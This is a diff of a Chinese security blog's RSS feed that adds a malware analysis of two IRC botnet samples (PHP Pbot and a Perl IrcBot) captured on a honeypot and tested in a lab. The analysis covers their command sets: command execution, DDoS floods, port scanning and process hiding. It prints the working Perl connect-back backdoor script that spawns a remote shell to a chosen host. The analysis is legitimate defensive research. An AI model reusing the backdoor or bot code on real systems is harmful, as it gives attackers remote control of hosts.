@@ -7,8 +7,394 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>zh_cn</language>
     <copyright>Copyright © 2018 kylinking</copyright>
-    <lastBuildDate>Wed, 16 May 2018 10:59:02 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 06 Jun 2018 10:01:49 +0000</lastBuildDate>
     <atom:link href="https://kylingit.com/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>两款IRC Bot的分析</title>
+      <link>https://kylingit.com/blog/%E4%B8%A4%E6%AC%BEirc-bot%E7%9A%84%E5%88%86%E6%9E%90/</link>
+      <pubDate>Wed, 06 Jun 2018 10:01:49 +0000</pubDate>
+      
+      <guid>https://kylingit.com/blog/%E4%B8%A4%E6%AC%BEirc-bot%E7%9A%84%E5%88%86%E6%9E%90/</guid>
+      <description>
+
+&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
+
+&lt;p&gt;近期在蜜罐上捕获到两个利用RCE漏洞传播的远控木马，经过分析判断是基于IRC协议的bot样本，分别是使用php编写的&lt;code&gt;Pbot&lt;/code&gt;和使用Perl版的&lt;code&gt;Perl IrcBot&lt;/code&gt;，下面简单分析一下这两个脚本。&lt;/p&gt;
+
+&lt;h2 id=&#34;0x01-irc协议简介&#34;&gt;0x01 IRC协议简介&lt;/h2&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;IRC是Internet Relay Chat 的英文缩写，中文一般称为互联网中继聊天。它是由芬兰人Jarkko Oikarinen于1988年首创的一种网络聊天协议。经过十年的发展，目前世界上有超过60个国家提供了IRC的服务。IRC的工作原理非常简单，您只要在自己的PC上运行客户端软件，然后通过因特网以IRC协议连接到一台IRC服务器上即可。它的特点是速度非常之快，聊天时几乎没有延迟的现象，并且只占用很小的带宽资源。所有用户可以在一个被称为Channel（频道）的地方就某一话题进行交谈或密谈。每个IRC的使用者都有一个Nickname（昵称）。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;基础IRC指令如下表，更详细的可以参考&lt;a href=&#34;https://github.com/sulit/docs/blob/master/src/irc/irc.md&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;指令&lt;/th&gt;
+&lt;th&gt;注释&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;/join #&lt;channel&gt;&lt;/td&gt;
+&lt;td&gt;加入名为channel的频道。所有频道名均以&amp;rsquo;#&amp;lsquo;开头。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;/part #&lt;channel&gt;&lt;/td&gt;
+&lt;td&gt;离开名为channel的频道。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;/nick &lt;NewNick&gt;&lt;/td&gt;
+&lt;td&gt;将你当前的昵称改为NewNick。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;/me &lt;action&gt;&lt;/td&gt;
+&lt;td&gt;在当前频道显示某个动作（举个例子，/me waves会显示&amp;rdquo;*JohnSmith waves&amp;rdquo;。）&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;/away &lt;Message&gt;&lt;/td&gt;
+&lt;td&gt;将你的状态标记为&amp;rdquo;Away&amp;rdquo;（离开），并向任何给你发消息的人发送内容为Message的信息。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;/msg &lt;nick&gt;&lt;message&gt;&lt;/td&gt;
+&lt;td&gt;向名为nick的用户发送内容为message的私信。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;/quit&lt;/td&gt;
+&lt;td&gt;终止IRC连接。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;在这两个bot中用到的比较关键的是&lt;code&gt;PRIVMSG &lt;/code&gt;指令，指的是Private Message（私密消息），它的基本格式类似这样：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;:Nick!user@host PRIVMSG destination :Message&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;黑客利用IRC协议与被控主机通信，C&amp;amp;C发送的指令就是这种格式，bot根据PRIVMSG后的Message进行相应操作，大致过程如下图所示&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Snipaste_20180605_111020.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;环境准备&#34;&gt;环境准备&lt;/h3&gt;
+
+&lt;p&gt;我们在本地Ubuntu系统搭建一个IRC服务器，用来模拟样本与C&amp;amp;C的通信。&lt;/p&gt;
+
+&lt;p&gt;1.搭建IRC服务器&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;apt-get install inspircd&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;修改配置文件&lt;code&gt;vim /etc/inspircd/inspircd.conf&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;修改&lt;code&gt;bind address&lt;/code&gt;监听在&lt;code&gt;0.0.0.0&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;启动服务&lt;code&gt;service inspircd start&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;2.使用mIRC软件模拟通信&lt;/p&gt;
+
+&lt;p&gt;在Windows下面可以使用mIRC软件进行irc通信，&lt;a href=&#34;https://www.mirc.com/get.html&#34;&gt;下载地址&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;创建一个IRC Servers &lt;code&gt;irc.local&lt;/code&gt;，地址为&lt;code&gt;192.168.3.195&lt;/code&gt;，密码可以为空&lt;/p&gt;
+
+&lt;p&gt;连接上本地IRC服务器后我们创建一个channel，叫做&lt;code&gt;#php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528252223926.png&#34; alt=&#34;1528252223926&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这样就加入了&lt;code&gt;#php&lt;/code&gt;channel&lt;/p&gt;
+
+&lt;h2 id=&#34;0x02-pbot&#34;&gt;0x02 Pbot&lt;/h2&gt;
+
+&lt;p&gt;Pbot是使用php编写的IrcBot&lt;/p&gt;
+
+&lt;h3 id=&#34;连接配置&#34;&gt;连接配置&lt;/h3&gt;
+
+&lt;p&gt;我们修改bot的连接配置，其中&lt;code&gt;hostauth&lt;/code&gt;是受信任的控制端，黑客会设置为自己的ip，我们将之设置为&lt;code&gt;*&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$cfg = array(
+    &amp;quot;server&amp;quot; =&amp;gt; &amp;quot;192.168.3.195&amp;quot;,	//irc服务器地址
+    &amp;quot;port&amp;quot; =&amp;gt; &amp;quot;6667&amp;quot;,
+    &amp;quot;key&amp;quot; =&amp;gt; &amp;quot;&amp;quot;,
+    &amp;quot;prefix&amp;quot; =&amp;gt; &amp;quot;&amp;quot;,
+    &amp;quot;maxrand&amp;quot; =&amp;gt; &amp;quot;8&amp;quot;,
+    &amp;quot;chan&amp;quot; =&amp;gt; &amp;quot;#php&amp;quot;,				//加入的频道
+    &amp;quot;trigger&amp;quot; =&amp;gt; &amp;quot;.&amp;quot;,				//指令分隔符
+    &amp;quot;hostauth&amp;quot; =&amp;gt; &amp;quot;*&amp;quot;				//受信任的远程主机，修改为*
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;然后可以增加一行语句来输出当前的connection状态，方便查看&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;echo fgets($this-&amp;gt;conn, 512);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;初始化阶段bot先设置好一些信息，例如服务器ip、端口等&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;public function start($cfg)
+{
+    $this-&amp;gt;config = $cfg;
+    while (true) {
+        if (!($this-&amp;gt;conn = fsockopen($this-&amp;gt;config[&#39;server&#39;], $this-&amp;gt;config[&#39;port&#39;], $e, $s, 30)))
+            $this-&amp;gt;start($cfg);
+        $ident = $this-&amp;gt;config[&#39;prefix&#39;];
+        $alph = range(&amp;quot;0&amp;quot;, &amp;quot;9&amp;quot;);
+        for ($i = 0; $i &amp;lt; $this-&amp;gt;config[&#39;maxrand&#39;]; $i++)
+            $ident .= $alph[rand(0, 9)];
+        $this-&amp;gt;send(&amp;quot;USER &amp;quot; . $ident . &amp;quot; 127.0.0.1 localhost :&amp;quot; . php_uname() . &amp;quot;&amp;quot;);
+        $this-&amp;gt;set_nick();
+        $this-&amp;gt;main();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;随后bot会设置一个随机名称加入相应的channel&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528252610192.png&#34; alt=&#34;1528252610192&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在IRC聊天室也能看到bot上线&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528252650212.png&#34; alt=&#34;1528252650212&#34; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;功能分析&#34;&gt;功能分析&lt;/h3&gt;
+
+&lt;p&gt;当连接建立后，bot会持续监听socket信息，然后根据C&amp;amp;C发送的指令进行响应&lt;/p&gt;
+
+&lt;p&gt;支持的指令有如下几种&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.user &lt;password&gt;&lt;/strong&gt; 用于登录bot，以便它接受其他命令。密码即为初始配置的密码，只有登录成功后才能进行后续指令下发操作&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.logout&lt;/strong&gt; 注销bot&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.die&lt;/strong&gt; 关闭与IRC服务器的连接&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.restart&lt;/strong&gt; 重启bot&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.mail &lt;to&gt; &lt;from&gt; &lt;subject&gt; &lt;msg&gt;&lt;/strong&gt;  发送邮件，调用php的&lt;code&gt;mail()&lt;/code&gt;函数，可以用来发送垃圾邮件&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.dns &lt;domain&gt;&lt;/strong&gt;进行DNS查询&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.download &lt;URL&gt; &lt;filename&gt;&lt;/strong&gt; 下载文件&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.exec &lt;command&gt;&lt;/strong&gt; 使用&lt;code&gt;exec()&lt;/code&gt;函数执行命令&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.cmd &lt;command&gt;&lt;/strong&gt; 使用&lt;code&gt;popen()&lt;/code&gt;函数执行命令&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.info&lt;/strong&gt; 获取系统信息&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.php &lt;php code&gt;&lt;/strong&gt;  使用&lt;code&gt;eval()&lt;/code&gt;函数执行php代码&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.tcpflood &lt;target&gt; &lt;packets&gt; &lt;packetsize&gt; &lt;port&gt; &lt;delay&gt;&lt;/strong&gt; TCP Flood攻击&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.udpflood &lt;target&gt; &lt;packets&gt; &lt;packetsize&gt; &lt;delay&gt;&lt;/strong&gt; UDP Flood洪水攻击&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.raw &lt;cmd&gt;&lt;/strong&gt; 原始IRC命令&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.rndnick&lt;/strong&gt; 更改bot昵称&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.pscan &lt;host&gt; &lt;port&gt;&lt;/strong&gt; 端口扫描&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.safe&lt;/strong&gt; 测试&lt;code&gt;safe_mode&lt;/code&gt;是否开启&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.inbox &lt;to&gt;&lt;/strong&gt; 测试收件箱&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;.conback &lt;ip&gt; &lt;port&gt;&lt;/strong&gt; 创建一个perl脚本并执行，可以反弹shell。&lt;/p&gt;
+
+&lt;p&gt;我们分析一下其中的几个指令&lt;/p&gt;
+
+&lt;p&gt;控制端在聊天室发送消息，指令需要以&lt;code&gt;.&lt;/code&gt;开头，因为下面会根据分隔符&lt;code&gt;.&lt;/code&gt;来取出实际命令&lt;/p&gt;
+
+&lt;p&gt;实际传输的指令是这样的格式&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;:test!test@192.168.3.193 PRIVMSG #php :.command&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;bot会根据PRIVMSG后面的&lt;code&gt;.command&lt;/code&gt;进入相应的分支&lt;/p&gt;
+
+&lt;h4 id=&#34;uname&#34;&gt;uname&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528254954215.png&#34; alt=&#34;1528254954215&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528254899287.png&#34; alt=&#34;1528254899287&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在进入对应指令的分支之前先判断当前连接的irc服务器是否在&lt;code&gt;hostauth&lt;/code&gt;列表，这决定了bot是否接受控制&lt;/p&gt;
+
+&lt;p&gt;再一个就是以&lt;code&gt;.&lt;/code&gt;来作为指令的起始符，这里应该取配置中的&lt;code&gt;trigger&lt;/code&gt;变量，但是此处被硬编码为&lt;code&gt;.&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;随后便进入&lt;code&gt;uname&lt;/code&gt;分支调用&lt;code&gt;php_uname()&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;h4 id=&#34;exec-cmd&#34;&gt;exec&amp;amp;cmd&lt;/h4&gt;
+
+&lt;p&gt;执行命令部分有两块可以实现，分别是exec和cmd&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528255190724.png&#34; alt=&#34;1528255190724&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;其中exec直接调用php内置的exec命令，cmd则是通过自定义方法&lt;code&gt;Exe()&lt;/code&gt;执行，在&lt;code&gt;Exe()&lt;/code&gt;方法内部对系统支持的命令执行函数进行了判断，可以通过以下几种方法使命令得到最终执行&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528255437456.png&#34; alt=&#34;1528255437456&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;pscan&#34;&gt;pscan&lt;/h4&gt;
+
+&lt;p&gt;可以探测指定ip的端口是否开放&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;.pscan ip port&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528271275578.png&#34; alt=&#34;1528271275578&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;conback&#34;&gt;conback&lt;/h4&gt;
+
+&lt;p&gt;&lt;code&gt;conback &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528270109767.png&#34; alt=&#34;1528270109767&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;该指令会在尝试在&lt;code&gt;/tmp/&lt;/code&gt;和&lt;code&gt;/var/tmp&lt;/code&gt;写入脚本，脚本使用perl语言编写并经过base64编码，执行后会向指定ip反弹一个shell，在连接断开后脚本自动删除。脚本内容如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl
+use Socket;
+print &amp;quot;Data Cha0s Connect Back Backdoor\n\n&amp;quot;;
+if (!$ARGV[0]) {
+  printf &amp;quot;Usage: $0 [Host] &amp;lt;Port&amp;gt;\n&amp;quot;;
+  exit(1);
+}
+print &amp;quot;[*] Dumping Arguments\n&amp;quot;;
+$host = $ARGV[0];
+$port = 80;
+if ($ARGV[1]) {
+  $port = $ARGV[1];
+}
+print &amp;quot;[*] Connecting...\n&amp;quot;;
+$proto = getprotobyname(&#39;tcp&#39;) || die(&amp;quot;Unknown Protocol\n&amp;quot;);
+socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die (&amp;quot;Socket Error\n&amp;quot;);
+my $target = inet_aton($host);
+if (!connect(SERVER, pack &amp;quot;SnA4x8&amp;quot;, 2, $port, $target)) {
+  die(&amp;quot;Unable to Connect\n&amp;quot;);
+}
+print &amp;quot;[*] Spawning Shell\n&amp;quot;;
+if (!fork( )) {
+  open(STDIN,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
+  open(STDOUT,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
+  open(STDERR,&amp;quot;&amp;gt;&amp;amp;SERVER&amp;quot;);
+  exec {&#39;/bin/sh&#39;} &#39;-bash&#39; . &amp;quot;\0&amp;quot; x 4;
+  exit(0);
+}
+print &amp;quot;[*] Datached\n\n&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;测试了几个功能都是可以正常使用的，如下图&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528269072874.png&#34; alt=&#34;1528269072874&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在数据包中也能清楚地看到交互过程&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528270676034.png&#34; alt=&#34;1528270676034&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;0x03-ddos-perl-ircbot&#34;&gt;0x03 DDoS Perl IrcBot&lt;/h2&gt;
+
+&lt;p&gt;基于Perl编写的IrcBot功能大致与Pbot相同，不过实现方式有些不一样&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528274109719.png&#34; alt=&#34;1528274109719&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从bot的帮助信息来看是支持不少指令的，主要分为以下几个功能模块&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;!u @system 	# 系统模块
+!u @version	# 版本信息
+!u @channel	# IRC频道操作模块
+!u @flood  	# DDoS模块
+!u @utils  	# 其它功能模块
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;连接配置-1&#34;&gt;连接配置&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;$server = &#39;192.168.3.195&#39; unless $server;	# 服务器ip，如果$server不存在则默认
+my $port = &#39;6667&#39;;	# 端口
+
+my $linas_max=&#39;8&#39;;
+my $sleep=&#39;5&#39;;
+
+my $homedir = &amp;quot;/tmp&amp;quot;;	#工作目录
+my $version = &#39;gztest v1&#39;; 
+
+my @admins = (&amp;quot;test&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;root1&amp;quot;,&amp;quot;root2&amp;quot;,&amp;quot;root3&amp;quot;,&amp;quot;root4&amp;quot;); # 管理员
+my @hostauth = (&amp;quot;192.168.3.193&amp;quot;); 	# 管理员ip
+my @channels = (&amp;quot;#Perl&amp;quot;); 	# IRC频道
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;同样的，我们在&lt;code&gt;192.168.3.195&lt;/code&gt;IRC服务器上创建一个&lt;code&gt;#Perl&lt;/code&gt;频道，运行后能看到bot上线&lt;/p&gt;
+
+&lt;h3 id=&#34;功能分析-1&#34;&gt;功能分析&lt;/h3&gt;
+
+&lt;h4 id=&#34;数据包&#34;&gt;数据包&lt;/h4&gt;
+
+&lt;p&gt;抓取数据包看一下IrcBot与IRC服务器之间的通信&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528274862059.png&#34; alt=&#34;1528274862059&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;发送消息部分是和Pbot是一样的，Pbot是通过起始符(&lt;code&gt;.&lt;/code&gt;)来提取具体指令，而在Perl IrcBot内部则是通过正则表达式来完成，即&lt;code&gt;parse&lt;/code&gt;方法&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528275278915.png&#34; alt=&#34;1528275278915&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;随后根据具体指令执行相应的功能&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;if (grep {$_ =~ /^\Q$hostmask\E$/i} @hostauth) {
+    if (grep {$_ =~ /^\Q$pn\E$/i} @admins) {	# 判断当前ip和用户是否是管理员
+        if ($onde eq &amp;quot;$meunick&amp;quot;) {
+            shell(&amp;quot;$pn&amp;quot;, &amp;quot;$args&amp;quot;);
+        }
+        if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/) {
+            my $natrix = $1;
+            my $arg = $2;
+            if ($arg =~ /^\!(.*)/) {			# 三种方法来执行功能
+                ircase(&amp;quot;$pn&amp;quot;, &amp;quot;$onde&amp;quot;, &amp;quot;$1&amp;quot;);
+            }
+            elsif ($arg =~ /^\@(.*)/) {
+                $ondep = $onde;
+                $ondep = $pn if $onde eq $meunick;
+                bfunc(&amp;quot;$ondep&amp;quot;, &amp;quot;$1&amp;quot;);			# help/irc/ddos/shell等功能
+            }
+            else {
+                shell(&amp;quot;$onde&amp;quot;, &amp;quot;$arg&amp;quot;);
+            }
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;bfunc&lt;/code&gt;方法作为最主要的模块，包含了4部分功能&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;帮助信息&lt;/strong&gt;  显示脚本帮助信息；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IRC频道操作&lt;/strong&gt;  包括加入退出频道，更改昵称，邀请朋友等；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DDoS模块&lt;/strong&gt;  包括TCP Flood、UDP Flood、HTTP DDoS等功能；&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;渗透辅助功能&lt;/strong&gt;   包括执行命令、反弹shell、端口扫描、文件下载等功能；&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;其中&lt;code&gt;ircase&lt;/code&gt;是相应的在IRC频道中的操作&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528276673338.png&#34; alt=&#34;1528276673338&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;用图形来表示bot的主要功能如下图所示&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528281340573.png&#34; alt=&#34;1528281340573&#34; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&#34;行为特征&#34;&gt;行为特征&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528277061564.png&#34; alt=&#34;1528277061564&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在bot启动的时候，不会以自身的进程启动，而是在&lt;code&gt;sshd&lt;/code&gt;，&lt;code&gt;apache&lt;/code&gt;等进程中随机fork一个启动，fork失败则退出脚本，这样子非常隐蔽地隐藏了自身进程，随后在加入IRC服务器的过程中也会随机选择一个IRC版本号加入。&lt;/p&gt;
+
+&lt;p&gt;在运行Perl IrcBot后，脚本选择以&lt;code&gt;/usr/sbin/cron&lt;/code&gt;的进程启动，而且可以明显看到CPU占用达到100%，脚本潜伏在正常进程中很难被发现。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/1528274476743.png&#34; alt=&#34;1528274476743&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;0x04-总结&#34;&gt;0x04 总结&lt;/h2&gt;
+
+&lt;p&gt;这两款IRC bot在互联网上已经存在很久了，最近被广泛利用的Drupal RCE漏洞和Weblogic XMLDecoder反序列化漏洞使此类基于IRC协议的恶意脚本重新流行起来，根据在线文件分享平台&lt;a href=&#34;https://pastebin.com/search?q=ircbot&#34;&gt;pastebin&lt;/a&gt;查询相关脚本也不在少数，而且存在多种语言版本的IRC bot，黑客直接通过各种远程漏洞植入样本，接受C&amp;amp;C控制，具有很大的危害性。&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>Django框架防止目录穿越——从路由传参说起</title>
@@ -2348,217 +2734,6 @@ MERGEBARCODE
 
 &lt;p&gt;参考：
 &lt;a href=&#34;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&#34;&gt;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&lt;/a&gt;&lt;/p&gt;
-
-&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>QQ 空间爬虫之爬取说说</title>
-      <link>https://kylingit.com/blog/qq-%E7%A9%BA%E9%97%B4%E7%88%AC%E8%99%AB%E4%B9%8B%E7%88%AC%E5%8F%96%E8%AF%B4%E8%AF%B4/</link>
-      <pubDate>Mon, 03 Apr 2017 19:37:30 +0000</pubDate>
-      
-      <guid>https://kylingit.com/blog/qq-%E7%A9%BA%E9%97%B4%E7%88%AC%E8%99%AB%E4%B9%8B%E7%88%AC%E5%8F%96%E8%AF%B4%E8%AF%B4/</guid>
-      <description>
-
-&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;
-
-&lt;p&gt;今天来讲获取说说~&lt;/p&gt;
-
-&lt;p&gt;为什么把获取说说放在后面讲呢，主要是说说的结构相对来说复杂一点，跟留言不一样，它包括三层结构，一是说说内容本身，二是说说的评论以及回复，第三就是这条说说获得的赞同数，从空间的角度来看可能这三者结合地很好，层次关系和赞同关系一目了然，但是我们从接口获取到的数据并非如此，一层一层来看。&lt;/p&gt;
-
-&lt;h3 id=&#34;接口地址&#34;&gt;接口地址&lt;/h3&gt;
-
-&lt;h4 id=&#34;所有说说&#34;&gt;所有说说&lt;/h4&gt;
-
-&lt;p&gt;首先还是数据的接口地址。方法还是和上篇获取留言一样，从控制台查看请求，从返回的json数据着手处理。
-说说的接口地址如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;https://h5.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msglist_v6?uin=目标qq&amp;amp;pos=起始位置&amp;amp;num=10&amp;amp;format=jsonp&amp;amp;g_tk=g_tk值
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;url本身就不分析了，和留言的相似，也是需要循环得到&lt;strong&gt;所有说说&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;h4 id=&#34;详细信息&#34;&gt;详细信息&lt;/h4&gt;
-
-&lt;p&gt;之所以强调所有说说，是因为在这里我们可以只取&lt;code&gt;tid&lt;/code&gt;值，这是说说的唯一标识，对于每一条具体的说说还有一个更详细的接口:
-&lt;!-- more --&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;https://h5.qzone.qq.com/proxy/domain/taotao.qq.com/cgi-bin/emotion_cgi_msgdetail_v6?uin=目标qq&amp;amp;tid=说说id&amp;amp;format=jsonp&amp;amp;g_tk=g_tk值
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以看到这是一个&lt;code&gt;detail&lt;/code&gt;的接口，返回的就是更详细的说说信息，由于太长了就不截图了，可以自己打开看一下。这个地址的关键参数便是刚刚提到的&lt;code&gt;tid&lt;/code&gt;，把&lt;code&gt;tid&lt;/code&gt;传过来，根据这个&lt;code&gt;tid&lt;/code&gt;和发布者，以及登录的&lt;code&gt;g_tk&lt;/code&gt;值，就能得到一条说说包括评论在内的详细信息。&lt;/p&gt;
-
-&lt;h4 id=&#34;点赞情况&#34;&gt;点赞情况&lt;/h4&gt;
-
-&lt;p&gt;上面两个地址能够得到所有说说以及每一条说说的详细内容，但还少了点东西，就是点赞数。上面两个接口的返回数据都没有点赞情况对应的数据，一开始也有点纳闷，这应该是在一个整体里面的，但看了好多遍，确实是没有。后来点了几次&lt;code&gt;xx等x人觉得很赞&lt;/code&gt;，从请求里看到点赞情况是有另外一个接口的：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;https://h5.qzone.qq.com/proxy/domain/users.qzone.qq.com/cgi-bin/likes/get_like_list_app?uin=目标qq&amp;amp;unikey=unikey&amp;amp;begin_uin=0&amp;amp;query_count=60&amp;amp;if_first_page=1&amp;amp;g_tk=g_tk值
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;其中&lt;code&gt;unikey&lt;/code&gt;是这条说说的地址：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;http://user.qzone.qq.com/目标qq/mood/说说id
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/Nt7FN&#34; alt=&#34;moods like&#34; /&gt;
